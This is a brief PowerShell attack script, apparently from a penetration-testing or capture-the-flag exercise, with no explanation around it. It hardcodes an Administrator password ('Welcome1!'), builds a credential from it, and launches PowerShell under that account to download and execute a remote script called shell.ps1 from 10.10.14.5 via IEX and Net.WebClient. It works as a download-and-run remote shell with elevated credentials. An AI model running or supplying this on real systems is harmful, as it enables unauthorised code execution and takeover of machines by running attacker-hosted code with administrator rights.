$password = "Welcome1!"
$secure_password = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $secure_password)

Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/shell.ps1')" -Credential $cred
